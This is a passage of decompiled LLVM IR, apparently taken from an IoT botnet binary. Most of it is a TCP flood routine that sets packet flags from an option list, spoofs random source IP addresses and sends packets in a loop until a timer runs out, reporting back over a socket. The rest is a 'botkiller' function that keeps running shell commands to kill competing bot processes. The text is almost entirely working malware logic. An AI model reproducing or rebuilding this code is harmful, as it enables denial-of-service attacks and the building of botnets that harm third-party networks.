  store i32 %v1_eac4, i32* %r3.global-to-local, align 4
  %v1_eac8 = trunc i32 %v1_eac4 to i8
  store i8 %v1_eac8, i8* %v2_eac0, align 1
  store i32 %v1_ea00, i32* %r2.global-to-local, align 4
  %v3_ead0 = load i8, i8* %v2_eac0, align 1
  %v4_ead0 = zext i8 %v3_ead0 to i32
  %v1_ead4 = or i32 %v4_ead0, 4
  store i32 %v1_ead4, i32* %r3.global-to-local, align 4
  %v1_ead8 = trunc i32 %v1_ead4 to i8
  store i8 %v1_ead8, i8* %v2_eac0, align 1
  store i32 %v1_ea00, i32* %r2.global-to-local, align 4
  %v3_eae0 = load i8, i8* %v2_eac0, align 1
  %v4_eae0 = zext i8 %v3_eae0 to i32
  %v1_eae4 = or i32 %v4_eae0, 1
  store i32 %v1_eae4, i32* %r3.global-to-local, align 4
  %v1_eae8 = trunc i32 %v1_eae4 to i8
  store i8 %v1_eae8, i8* %v2_eac0, align 1
  store i32 %v1_ea00, i32* %r2.global-to-local, align 4
  %v3_eaf0 = load i8, i8* %v2_eac0, align 1
  %v4_eaf0 = zext i8 %v3_eaf0 to i32
  %v1_eaf4 = or i32 %v4_eaf0, 16
  store i32 %v1_eaf4, i32* %r3.global-to-local, align 4
  %v1_eaf8 = trunc i32 %v1_eaf4 to i8
  store i8 %v1_eaf8, i8* %v2_eac0, align 1
  store i32 %v1_ea00, i32* %r2.global-to-local, align 4
  %v3_eb00 = load i8, i8* %v2_eac0, align 1
  %v4_eb00 = zext i8 %v3_eb00 to i32
  %v1_eb04 = or i32 %v4_eb00, 8
  store i32 %v1_eb04, i32* %r3.global-to-local, align 4
  %v1_eb08 = trunc i32 %v1_eb04 to i8
  store i8 %v1_eb08, i8* %v2_eac0, align 1
  br label %dec_label_pc_ec54

dec_label_pc_eb10:                                ; preds = %dec_label_pc_e9ac
  %v3_eb10 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_eb10, i32* %r3.global-to-local, align 4
  store i32 %v3_eb10, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1bc90.405 to i32), i32* @r1, align 4
  %v2_eb1c = call i32 @__GI_strtok(i32 %v3_eb10, i32 ptrtoint (i32* @global_var_1bc90.405 to i32))
  store i32 %v2_eb1c, i32* %r3.global-to-local, align 4
  %v2_ec4c20 = icmp eq i32 %v2_eb1c, 0
  br i1 %v2_ec4c20, label %dec_label_pc_ec54, label %dec_label_pc_eb2c.lr.ph

dec_label_pc_eb2c.lr.ph:                          ; preds = %dec_label_pc_eb10
  %v1_eb4c = add i32 %v3_e9e0, 33
  %v2_eb4c = inttoptr i32 %v1_eb4c to i8*
  br label %dec_label_pc_eb2c

dec_label_pc_eb2c:                                ; preds = %dec_label_pc_eb2c.lr.ph, %dec_label_pc_ec34
  %storemerge1421 = phi i32 [ %v2_eb1c, %dec_label_pc_eb2c.lr.ph ], [ %v2_ec3c, %dec_label_pc_ec34 ]
  store i32 %storemerge1421, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1bc94.407 to i32), i32* @r1, align 4
  %v3_eb38 = inttoptr i32 %storemerge1421 to i8*
  %v4_eb38 = call i32 @__GI_strcoll(i8* %v3_eb38, i32 ptrtoint ([4 x i8]* @global_var_1bc94.407 to i32))
  store i32 %v4_eb38, i32* %r3.global-to-local, align 4
  %v2_eb40 = icmp eq i32 %v4_eb38, 0
  br i1 %v2_eb40, label %dec_label_pc_eb48, label %dec_label_pc_eb5c

dec_label_pc_eb48:                                ; preds = %dec_label_pc_eb2c
  store i32 %v1_ea00, i32* %r2.global-to-local, align 4
  %v3_eb4c = load i8, i8* %v2_eb4c, align 1
  %v4_eb4c = zext i8 %v3_eb4c to i32
  %v1_eb50 = or i32 %v4_eb4c, 2
  store i32 %v1_eb50, i32* %r3.global-to-local, align 4
  %v1_eb54 = trunc i32 %v1_eb50 to i8
  store i8 %v1_eb54, i8* %v2_eb4c, align 1
  br label %dec_label_pc_ec34

dec_label_pc_eb5c:                                ; preds = %dec_label_pc_eb2c
  store i32 %storemerge1421, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1bc98.409 to i32), i32* @r1, align 4
  %v4_eb68 = call i32 @__GI_strcoll(i8* %v3_eb38, i32 ptrtoint ([4 x i8]* @global_var_1bc98.409 to i32))
  store i32 %v4_eb68, i32* %r3.global-to-local, align 4
  %v2_eb70 = icmp eq i32 %v4_eb68, 0
  br i1 %v2_eb70, label %dec_label_pc_eb78, label %dec_label_pc_eb8c

dec_label_pc_eb78:                                ; preds = %dec_label_pc_eb5c
  store i32 %v1_ea00, i32* %r2.global-to-local, align 4
  %v3_eb7c = load i8, i8* %v2_eb4c, align 1
  %v4_eb7c = zext i8 %v3_eb7c to i32
  %v1_eb80 = or i32 %v4_eb7c, 4
  store i32 %v1_eb80, i32* %r3.global-to-local, align 4
  %v1_eb84 = trunc i32 %v1_eb80 to i8
  store i8 %v1_eb84, i8* %v2_eb4c, align 1
  br label %dec_label_pc_ec34

dec_label_pc_eb8c:                                ; preds = %dec_label_pc_eb5c
  store i32 %storemerge1421, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1bc9c.411 to i32), i32* @r1, align 4
  %v4_eb98 = call i32 @__GI_strcoll(i8* %v3_eb38, i32 ptrtoint ([4 x i8]* @global_var_1bc9c.411 to i32))
  store i32 %v4_eb98, i32* %r3.global-to-local, align 4
  %v2_eba0 = icmp eq i32 %v4_eb98, 0
  br i1 %v2_eba0, label %dec_label_pc_eba8, label %dec_label_pc_ebbc

dec_label_pc_eba8:                                ; preds = %dec_label_pc_eb8c
  store i32 %v1_ea00, i32* %r2.global-to-local, align 4
  %v3_ebac = load i8, i8* %v2_eb4c, align 1
  %v4_ebac = zext i8 %v3_ebac to i32
  %v1_ebb0 = or i32 %v4_ebac, 1
  store i32 %v1_ebb0, i32* %r3.global-to-local, align 4
  %v1_ebb4 = trunc i32 %v1_ebb0 to i8
  store i8 %v1_ebb4, i8* %v2_eb4c, align 1
  br label %dec_label_pc_ec34

dec_label_pc_ebbc:                                ; preds = %dec_label_pc_eb8c
  store i32 %storemerge1421, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1bca0.413 to i32), i32* @r1, align 4
  %v4_ebc8 = call i32 @__GI_strcoll(i8* %v3_eb38, i32 ptrtoint ([4 x i8]* @global_var_1bca0.413 to i32))
  store i32 %v4_ebc8, i32* %r3.global-to-local, align 4
  %v2_ebd0 = icmp eq i32 %v4_ebc8, 0
  br i1 %v2_ebd0, label %dec_label_pc_ebd8, label %dec_label_pc_ebec

dec_label_pc_ebd8:                                ; preds = %dec_label_pc_ebbc
  store i32 %v1_ea00, i32* %r2.global-to-local, align 4
  %v3_ebdc = load i8, i8* %v2_eb4c, align 1
  %v4_ebdc = zext i8 %v3_ebdc to i32
  %v1_ebe0 = or i32 %v4_ebdc, 16
  store i32 %v1_ebe0, i32* %r3.global-to-local, align 4
  %v1_ebe4 = trunc i32 %v1_ebe0 to i8
  store i8 %v1_ebe4, i8* %v2_eb4c, align 1
  br label %dec_label_pc_ec34

dec_label_pc_ebec:                                ; preds = %dec_label_pc_ebbc
  store i32 %storemerge1421, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1bca4.415 to i32), i32* @r1, align 4
  %v4_ebf8 = call i32 @__GI_strcoll(i8* %v3_eb38, i32 ptrtoint ([4 x i8]* @global_var_1bca4.415 to i32))
  store i32 %v4_ebf8, i32* %r3.global-to-local, align 4
  %v2_ec00 = icmp eq i32 %v4_ebf8, 0
  br i1 %v2_ec00, label %dec_label_pc_ec08, label %dec_label_pc_ec1c

dec_label_pc_ec08:                                ; preds = %dec_label_pc_ebec
  store i32 %v1_ea00, i32* %r2.global-to-local, align 4
  %v3_ec0c = load i8, i8* %v2_eb4c, align 1
  %v4_ec0c = zext i8 %v3_ec0c to i32
  %v1_ec10 = or i32 %v4_ec0c, 8
  store i32 %v1_ec10, i32* %r3.global-to-local, align 4
  %v1_ec14 = trunc i32 %v1_ec10 to i8
  store i8 %v1_ec14, i8* %v2_eb4c, align 1
  br label %dec_label_pc_ec34

dec_label_pc_ec1c:                                ; preds = %dec_label_pc_ebec
  %v2_ec20 = load i32, i32* @global_var_2d604.55, align 4
  store i32 %v2_ec20, i32* %r3.global-to-local, align 4
  store i32 %storemerge1421, i32* @r2, align 4
  %v3_ec30 = call i32 @sockprintf(i32 %v2_ec20, i32 ptrtoint ([18 x i8]* @global_var_1bca8.417 to i32))
  br label %dec_label_pc_ec34

dec_label_pc_ec34:                                ; preds = %dec_label_pc_ec08, %dec_label_pc_ebd8, %dec_label_pc_eba8, %dec_label_pc_eb78, %dec_label_pc_eb48, %dec_label_pc_ec1c
  store i32 0, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1bc90.405 to i32), i32* @r1, align 4
  %v2_ec3c = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_1bc90.405 to i32))
  store i32 %v2_ec3c, i32* %r3.global-to-local, align 4
  %v2_ec4c = icmp eq i32 %v2_ec3c, 0
  br i1 %v2_ec4c, label %dec_label_pc_ec54, label %dec_label_pc_eb2c

dec_label_pc_ec54:                                ; preds = %dec_label_pc_ec34, %dec_label_pc_eb10, %dec_label_pc_eabc
  %v0_ec54 = call i32 @rand_cmwc()
  %v3_ec60 = urem i32 %v0_ec54, 65536
  store i32 %v3_ec60, i32* %r3.global-to-local, align 4
  store i32 %v1_ea00, i32* %r2.global-to-local, align 4
  %v1_ec68 = trunc i32 %v0_ec54 to i8
  %v3_ec68 = add i32 %v3_e9e0, 34
  %v4_ec68 = inttoptr i32 %v3_ec68 to i8*
  store i8 %v1_ec68, i8* %v4_ec68, align 2
  %v0_ec6c = load i32, i32* %r3.global-to-local, align 4
  %v3_ec6c25 = udiv i32 %v0_ec6c, 256
  %v1_ec70 = trunc i32 %v3_ec6c25 to i8
  %v2_ec70 = load i32, i32* %r2.global-to-local, align 4
  %v3_ec70 = add i32 %v2_ec70, 15
  %v4_ec70 = inttoptr i32 %v3_ec70 to i8*
  store i8 %v1_ec70, i8* %v4_ec70, align 1
  store i32 %v1_ea00, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_ec7c = add i32 %v3_e9e0, 36
  %v4_ec7c = inttoptr i32 %v3_ec7c to i8*
  store i8 0, i8* %v4_ec7c, align 4
  %v0_ec80 = load i32, i32* %r3.global-to-local, align 4
  %v1_ec80 = trunc i32 %v0_ec80 to i8
  %v2_ec80 = load i32, i32* %r2.global-to-local, align 4
  %v3_ec80 = add i32 %v2_ec80, 17
  %v4_ec80 = inttoptr i32 %v3_ec80 to i8*
  store i8 %v1_ec80, i8* %v4_ec80, align 1
  store i32 %v1_ea00, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_ec8c = add i32 %v3_e9e0, 38
  %v4_ec8c = inttoptr i32 %v3_ec8c to i8*
  store i8 0, i8* %v4_ec8c, align 2
  %v0_ec90 = load i32, i32* %r3.global-to-local, align 4
  %v1_ec90 = trunc i32 %v0_ec90 to i8
  %v2_ec90 = load i32, i32* %r2.global-to-local, align 4
  %v3_ec90 = add i32 %v2_ec90, 19
  %v4_ec90 = inttoptr i32 %v3_ec90 to i8*
  store i8 %v1_ec90, i8* %v4_ec90, align 1
  store i32 %arg2, i32* %r3.global-to-local, align 4
  br i1 %v2_e86c, label %dec_label_pc_eca0, label %dec_label_pc_ecb8

dec_label_pc_eca0:                                ; preds = %dec_label_pc_ec54
  %v0_eca0 = call i32 @rand_cmwc()
  %v3_eca8 = mul i32 %v0_eca0, 65536
  store i32 %v3_eca8, i32* %r3.global-to-local, align 4
  %extract.t = trunc i32 %v0_eca0 to i8
  br label %dec_label_pc_ecd4

dec_label_pc_ecb8:                                ; preds = %dec_label_pc_ec54
  %v3_ecc0 = urem i32 %arg2, 65536
  store i32 %v3_ecc0, i32* %r3.global-to-local, align 4
  %v1_ecc8 = call i32 @htons(i32 %v3_ecc0)
  %extract.t71 = trunc i32 %v1_ecc8 to i8
  br label %dec_label_pc_ecd4

dec_label_pc_ecd4:                                ; preds = %dec_label_pc_eca0, %dec_label_pc_ecb8
  %v0_eca0.sink.off0 = phi i8 [ %extract.t, %dec_label_pc_eca0 ], [ %extract.t71, %dec_label_pc_ecb8 ]
  store i32 %v1_ea00, i32* %r2.global-to-local, align 4
  %v4_ecd8 = sext i8 %v0_eca0.sink.off0 to i32
  %v3_ecdc = add i32 %v3_e9e0, 22
  %v4_ecdc = inttoptr i32 %v3_ecdc to i8*
  store i8 %v0_eca0.sink.off0, i8* %v4_ecdc, align 2
  %v3_ece4 = sdiv i32 %v4_ecd8, 256
  %v4_ece4 = trunc i32 %v3_ece4 to i8
  store i32 %v3_ece4, i32* %r3.global-to-local, align 4
  %v4_ece8 = add i32 %v3_e9e0, 23
  %v5_ece8 = inttoptr i32 %v4_ece8 to i8*
  store i8 %v4_ece4, i8* %v5_ece8, align 1
  %v5_ecf4 = call i32 @tcpcsum(i32 %v3_e9e0, i32 %v1_ea00, i32 %v1_ea00, i32 %v3_ece4)
  %sext = mul i32 %v5_ecf4, 16777216
  %v1_ecf8 = sdiv i32 %sext, 16777216
  store i32 %v1_ecf8, i32* %r3.global-to-local, align 4
  store i32 %v1_ea00, i32* %r2.global-to-local, align 4
  %v1_ed00 = trunc i32 %v1_ecf8 to i8
  store i8 %v1_ed00, i8* %v4_ec7c, align 4
  %v0_ed04 = load i32, i32* %r3.global-to-local, align 4
  %v3_ed0428 = udiv i32 %v0_ed04, 256
  %v1_ed08 = trunc i32 %v3_ed0428 to i8
  %v2_ed08 = load i32, i32* %r2.global-to-local, align 4
  %v3_ed08 = add i32 %v2_ed08, 17
  %v4_ed08 = inttoptr i32 %v3_ed08 to i8*
  store i8 %v1_ed08, i8* %v4_ed08, align 1
  %v1_ed18 = or i32 %v3_e9e0, 2
  store i32 %v1_ed18, i32* %r3.global-to-local, align 4
  %v1_ed1c = inttoptr i32 %v1_ed18 to i8*
  %v2_ed1c = load i8, i8* %v1_ed1c, align 2
  %v3_ed1c = zext i8 %v2_ed1c to i32
  store i32 %v3_ed1c, i32* %r2.global-to-local, align 4
  %v1_ed20 = or i32 %v1_e9dc, 3
  %v2_ed20 = inttoptr i32 %v1_ed20 to i8*
  %v3_ed20 = load i8, i8* %v2_ed20, align 1
  %v4_ed20 = zext i8 %v3_ed20 to i32
  %v4_ed24 = mul nuw nsw i32 %v4_ed20, 256
  %v5_ed24 = or i32 %v4_ed24, %v3_ed1c
  store i32 %v5_ed24, i32* %r3.global-to-local, align 4
  %v3_ed30 = call i32 @csum(i8* %v4_ea3c, i32 %v5_ed24)
  %sext4 = mul i32 %v3_ed30, 16777216
  %v1_ed34 = sdiv i32 %sext4, 16777216
  store i32 %v1_ed34, i32* %r3.global-to-local, align 4
  store i32 %v3_e9e0, i32* %r2.global-to-local, align 4
  %v1_ed3c = trunc i32 %v1_ed34 to i8
  %v3_ed3c = add i32 %v3_e9e0, 10
  %v4_ed3c = inttoptr i32 %v3_ed3c to i8*
  store i8 %v1_ed3c, i8* %v4_ed3c, align 2
  %v0_ed40 = load i32, i32* %r3.global-to-local, align 4
  %v3_ed40 = sdiv i32 %v0_ed40, 256
  store i32 %v3_ed40, i32* %r3.global-to-local, align 4
  %v1_ed44 = trunc i32 %v3_ed40 to i8
  %v2_ed44 = load i32, i32* %r2.global-to-local, align 4
  %v3_ed44 = add i32 %v2_ed44, 11
  %v4_ed44 = inttoptr i32 %v3_ed44 to i8*
  store i8 %v1_ed44, i8* %v4_ed44, align 1
  %v2_ed4c = call i32 @__GI_time(i32* null)
  %v2_ed58 = add i32 %v2_ed4c, %arg3
  store i32 %v2_ed58, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_edb0 = add i32 %v3_e9e0, 12
  %v3_edb0 = inttoptr i32 %v2_edb0 to i32*
  %v3_edc8 = add i32 %v3_e9e0, 4
  %v4_edc8 = inttoptr i32 %v3_edc8 to i8*
  %v4_ee10 = add i32 %v3_e9e0, 37
  %v5_ee10 = inttoptr i32 %v4_ee10 to i8*
  br label %dec_label_pc_ed6c

dec_label_pc_ed6c:                                ; preds = %dec_label_pc_eea4, %dec_label_pc_ee98, %dec_label_pc_ecd4
  %stack_var_-88.0 = phi i32 [ 0, %dec_label_pc_ecd4 ], [ 0, %dec_label_pc_ee98 ], [ %v1_eea8, %dec_label_pc_eea4 ]
  store i32 %v3_e9e0, i32* %r2.global-to-local, align 4
  %v1_ed74 = load i32, i32* @sp, align 4
  %v2_ed74 = inttoptr i32 %v1_ed74 to i32*
  store i32 %v2_e8dc, i32* %v2_ed74, align 4
  %v1_ed7c = load i32, i32* @sp, align 4
  %v2_ed7c = add i32 %v1_ed7c, 4
  %v3_ed7c = inttoptr i32 %v2_ed7c to i32*
  store i32 16, i32* %v3_ed7c, align 4
  %v0_ed84 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v1_e9b0, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v6_ed90 = inttoptr i32 %v0_ed84 to i32*
  %v7_ed90 = call i32 @__libc_sendto(i32 %v0_e900, i32* %v6_ed90, i32 %v1_e9b0, i32 0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v1_ed98 = call i32 @GetRandomIP(i32 %storemerge10)
  store i32 %v1_ed98, i32* %r3.global-to-local, align 4
  %v1_eda4 = call i32 @htonl(i32 %v1_ed98)
  store i32 %v1_eda4, i32* %r2.global-to-local, align 4
  store i32 %v3_e9e0, i32* %r3.global-to-local, align 4
  store i32 %v1_eda4, i32* %v3_edb0, align 4
  %v0_edb4 = call i32 @rand_cmwc()
  %v3_edc0 = urem i32 %v0_edb4, 65536
  store i32 %v3_edc0, i32* %r3.global-to-local, align 4
  store i32 %v3_e9e0, i32* %r2.global-to-local, align 4
  %v1_edc8 = trunc i32 %v0_edb4 to i8
  store i8 %v1_edc8, i8* %v4_edc8, align 4
  %v0_edcc = load i32, i32* %r3.global-to-local, align 4
  %v3_edcc = sdiv i32 %v0_edcc, 256
  store i32 %v3_edcc, i32* %r3.global-to-local, align 4
  %v1_edd0 = trunc i32 %v3_edcc to i8
  %v2_edd0 = load i32, i32* %r2.global-to-local, align 4
  %v3_edd0 = add i32 %v2_edd0, 5
  %v4_edd0 = inttoptr i32 %v3_edd0 to i8*
  store i8 %v1_edd0, i8* %v4_edd0, align 1
  %v0_edd4 = call i32 @rand_cmwc()
  store i32 %v0_edd4, i32* %r2.global-to-local, align 4
  store i32 %v1_ea00, i32* %r3.global-to-local, align 4
  store i32 %v0_edd4, i32* %v3_ea6c, align 4
  %v0_ede4 = call i32 @rand_cmwc()
  %v3_edf0 = urem i32 %v0_ede4, 65536
  store i32 %v3_edf0, i32* %r3.global-to-local, align 4
  store i32 %v1_ea00, i32* %r2.global-to-local, align 4
  %v1_edf8 = trunc i32 %v0_ede4 to i8
  store i8 %v1_edf8, i8* %v5_ea04, align 4
  %v0_edfc = load i32, i32* %r3.global-to-local, align 4
  %v3_edfc29 = udiv i32 %v0_edfc, 256
  %v1_ee00 = trunc i32 %v3_edfc29 to i8
  %v2_ee00 = load i32, i32* %r2.global-to-local, align 4
  %v3_ee00 = add i32 %v2_ee00, 1
  %v4_ee00 = inttoptr i32 %v3_ee00 to i8*
  store i8 %v1_ee00, i8* %v4_ee00, align 1
  store i32 %v1_ea00, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i8 0, i8* %v4_ec7c, align 4
  store i8 0, i8* %v5_ee10, align 1
  %v5_ee1c = call i32 @tcpcsum(i32 %v3_e9e0, i32 %v1_ea00, i32 %v1_ea00, i32 0)
  %sext5 = mul i32 %v5_ee1c, 16777216
  %v1_ee20 = sdiv i32 %sext5, 16777216
  store i32 %v1_ee20, i32* %r3.global-to-local, align 4
  store i32 %v1_ea00, i32* %r2.global-to-local, align 4
  %v1_ee28 = trunc i32 %v1_ee20 to i8
  store i8 %v1_ee28, i8* %v4_ec7c, align 4
  %v0_ee2c = load i32, i32* %r3.global-to-local, align 4
  %v3_ee2c30 = udiv i32 %v0_ee2c, 256
  %v1_ee30 = trunc i32 %v3_ee2c30 to i8
  %v2_ee30 = load i32, i32* %r2.global-to-local, align 4
  %v3_ee30 = add i32 %v2_ee30, 17
  %v4_ee30 = inttoptr i32 %v3_ee30 to i8*
  store i8 %v1_ee30, i8* %v4_ee30, align 1
  store i32 %v1_ed18, i32* %r3.global-to-local, align 4
  %v2_ee44 = load i8, i8* %v1_ed1c, align 2
  %v3_ee44 = zext i8 %v2_ee44 to i32
  store i32 %v3_ee44, i32* %r2.global-to-local, align 4
  %v3_ee48 = load i8, i8* %v2_ed20, align 1
  %v4_ee48 = zext i8 %v3_ee48 to i32
  %v4_ee4c = mul nuw nsw i32 %v4_ee48, 256
  %v5_ee4c = or i32 %v4_ee4c, %v3_ee44
  store i32 %v5_ee4c, i32* %r3.global-to-local, align 4
  %v3_ee58 = call i32 @csum(i8* %v4_ea3c, i32 %v5_ee4c)
  %sext6 = mul i32 %v3_ee58, 16777216
  %v1_ee5c = sdiv i32 %sext6, 16777216
  store i32 %v1_ee5c, i32* %r3.global-to-local, align 4
  store i32 %v3_e9e0, i32* %r2.global-to-local, align 4
  %v1_ee64 = trunc i32 %v1_ee5c to i8
  store i8 %v1_ee64, i8* %v4_ed3c, align 2
  %v0_ee68 = load i32, i32* %r3.global-to-local, align 4
  %v3_ee6831 = udiv i32 %v0_ee68, 256
  %v1_ee6c = trunc i32 %v3_ee6831 to i8
  %v2_ee6c = load i32, i32* %r2.global-to-local, align 4
  %v3_ee6c = add i32 %v2_ee6c, 11
  %v4_ee6c = inttoptr i32 %v3_ee6c to i8*
  store i8 %v1_ee6c, i8* %v4_ee6c, align 1
  store i32 %stack_var_-88.0, i32* %r3.global-to-local, align 4
  %v9_ee78 = icmp eq i32 %stack_var_-88.0, %arg7
  br i1 %v9_ee78, label %dec_label_pc_ee80, label %dec_label_pc_eea4

dec_label_pc_ee80:                                ; preds = %dec_label_pc_ed6c
  %v2_ee84 = call i32 @__GI_time(i32* null)
  store i32 %v2_ee84, i32* %r2.global-to-local, align 4
  store i32 %v2_ed58, i32* %r3.global-to-local, align 4
  %v8_ee94 = icmp sgt i32 %v2_ee84, %v2_ed58
  br i1 %v8_ee94, label %dec_label_pc_eeb4, label %dec_label_pc_ee98

dec_label_pc_ee98:                                ; preds = %dec_label_pc_ee80
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_ed6c

dec_label_pc_eea4:                                ; preds = %dec_label_pc_ed6c
  %v1_eea8 = add i32 %stack_var_-88.0, 1
  store i32 %v1_eea8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_ed6c

dec_label_pc_eeb4:                                ; preds = %dec_label_pc_ee80, %dec_label_pc_e8b8, %dec_label_pc_e964, %dec_label_pc_e918
  %v12_eebc = phi i32 [ %v3_e8c8, %dec_label_pc_e8b8 ], [ %v3_e974, %dec_label_pc_e964 ], [ %v3_e928, %dec_label_pc_e918 ], [ %v2_ee84, %dec_label_pc_ee80 ]
  store i32 %v3_e82c, i32* @r4, align 4
  store i32 %v6_e82c, i32* @fp, align 4
  ret i32 %v12_eebc

; uselistorder directives
  uselistorder i32 %v1_eea8, { 1, 0 }
  uselistorder i32 %v1_ee5c, { 1, 0 }
  uselistorder i32 %v1_ee20, { 1, 0 }
  uselistorder i32 %v0_ede4, { 1, 0 }
  uselistorder i32 %v3_edcc, { 1, 0 }
  uselistorder i32 %v0_edb4, { 1, 0 }
  uselistorder i32 %stack_var_-88.0, { 0, 2, 1 }
  uselistorder i32 %v2_ed58, { 1, 0, 2 }
  uselistorder i32 %v3_ed40, { 1, 0 }
  uselistorder i32 %v1_ed34, { 1, 0 }
  uselistorder i32 %v1_ed18, { 0, 2, 1 }
  uselistorder i32 %v1_ecf8, { 1, 0 }
  uselistorder i32 %v3_ece4, { 2, 0, 1 }
  uselistorder i8 %v0_eca0.sink.off0, { 1, 0 }
  uselistorder i32 %v3_ecc0, { 1, 0 }
  uselistorder i32 %v0_eca0, { 1, 0 }
  uselistorder i32 %v0_ec54, { 1, 0 }
  uselistorder i32 %v2_ec3c, { 1, 0, 2 }
  uselistorder i32 %storemerge1421, { 6, 5, 4, 3, 2, 0, 1 }
  uselistorder i8* %v2_eb4c, { 4, 5, 3, 6, 2, 7, 1, 8, 0, 9 }
  uselistorder i8* %v2_eac0, { 1, 5, 2, 6, 3, 7, 4, 8, 0, 9 }
  uselistorder i32 %v3_ea58, { 1, 0 }
  uselistorder i32 %v0_ea40, { 1, 0 }
  uselistorder i32 %v1_ea00, { 5, 7, 6, 8, 9, 10, 11, 13, 12, 14, 15, 16, 17, 22, 21, 20, 19, 18, 0, 1, 2, 3, 4, 23, 24, 25, 26 }
  uselistorder i32 %v3_e9e0, { 12, 11, 10, 8, 6, 23, 9, 7, 4, 5, 22, 3, 21, 20, 19, 18, 17, 16, 24, 15, 14, 13, 2, 1, 0 }
  uselistorder i32 %v1_e9b0, { 1, 0 }
  uselistorder i32 %v3_e89c, { 1, 0 }
  uselistorder i32* %stack_var_0, { 1, 2, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-64, { 1, 0 }
  uselistorder i32* %stack_var_-60, { 1, 0, 2 }
  uselistorder i32* %stack_var_-68, { 0, 2, 1 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 6, 7, 4, 5, 11, 12, 8, 9, 10, 13, 14, 15, 16, 17, 18, 19, 20, 21, 24, 25, 22, 23, 27, 28, 26, 29, 30, 31, 32, 33, 34, 35, 36, 37, 54, 38, 39, 41, 40, 42, 44, 43, 45, 47, 46, 48, 50, 49, 51, 53, 52, 83, 55, 56, 57, 58, 59, 60, 63, 61, 62, 64, 65, 66, 67, 69, 68, 70, 71, 72, 74, 73, 75, 76, 77, 79, 78, 80, 81, 82, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 13, 11, 12, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @tcpcsum, { 1, 0 }
  uselistorder i32 (i32)* @htonl, { 3, 2, 1, 0 }
  uselistorder i32 (i32)* @GetRandomIP, { 3, 2, 1, 0 }
  uselistorder i32 ()* @rand_cmwc, { 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg6, { 2, 1, 0 }
  uselistorder i32 %arg4, { 0, 2, 1, 3 }
  uselistorder i32 %arg2, { 0, 2, 1, 4, 3 }
  uselistorder label %dec_label_pc_eeb4, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_ecd4, { 1, 0 }
  uselistorder label %dec_label_pc_ec34, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_eb2c, { 1, 0 }
  uselistorder label %dec_label_pc_e9ac, { 1, 0 }
  uselistorder label %dec_label_pc_e8b8, { 1, 0 }
}

define i32 @botkiller(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-100 = alloca i8*, align 4
  %v2_eef8 = ptrtoint i8** %stack_var_-100 to i32
  %v2_ef44 = bitcast i8** %stack_var_-100 to i8*
  br label %dec_label_pc_eefc

dec_label_pc_eefc:                                ; preds = %dec_label_pc_efd4, %entry
  br label %dec_label_pc_ef08

dec_label_pc_ef08:                                ; preds = %dec_label_pc_eefc, %dec_label_pc_ef08
  %storemerge45 = phi i32 [ 0, %dec_label_pc_eefc ], [ %v1_efc0, %dec_label_pc_ef08 ]
  store i8* inttoptr (i32 1818848112 to i8*), i8** %stack_var_-100, align 4
  %v4_ef34 = mul nuw nsw i32 %storemerge45, 4
  %v5_ef34 = add i32 %v4_ef34, ptrtoint ([87 x i8*]* @global_var_2d024.506 to i32)
  %v6_ef34 = inttoptr i32 %v5_ef34 to i32*
  %v7_ef34 = load i32, i32* %v6_ef34, align 4
  store i32 %v7_ef34, i32* @r1, align 4
  %v3_ef44 = call i32 @strcat(i8* %v2_ef44, i32 %v7_ef34)
  %v1_ef50 = call i32 @__libc_system(i32 %v2_eef8)
  store i8* inttoptr (i32 1818848112 to i8*), i8** %stack_var_-100, align 4
  %v7_ef8c = load i32, i32* %v6_ef34, align 4
  store i32 %v7_ef8c, i32* @r1, align 4
  %v3_ef9c = call i32 @strcat(i8* %v2_ef44, i32 %v7_ef8c)
  store i32 ptrtoint (i32* @global_var_1bcd4.512 to i32), i32* @r1, align 4
  %v3_efac = call i32 @strcat(i8* %v2_ef44, i32 ptrtoint (i32* @global_var_1bcd4.512 to i32))
  %v1_efb8 = call i32 @__libc_system(i32 %v2_eef8)
  %v1_efc0 = add nuw nsw i32 %storemerge45, 1
  %v7_efd0 = icmp slt i32 %v1_efc0, 9
  br i1 %v7_efd0, label %dec_label_pc_ef08, label %dec_label_pc_efd4

dec_label_pc_efd4:                                ; preds = %dec_label_pc_ef08
  %v1_efd8 = call i32 @sleep(i32 5)
  br label %dec_label_pc_eefc

; uselistorder directives
  uselistorder i32 %storemerge45, { 1, 0 }
  uselistorder i8** %stack_var_-100, { 3, 2, 0, 1 }
  uselistorder i32 57, { 1, 0 }
  uselistorder i32 51, { 1, 0 }
  uselistorder i32 50, { 0, 2, 1 }
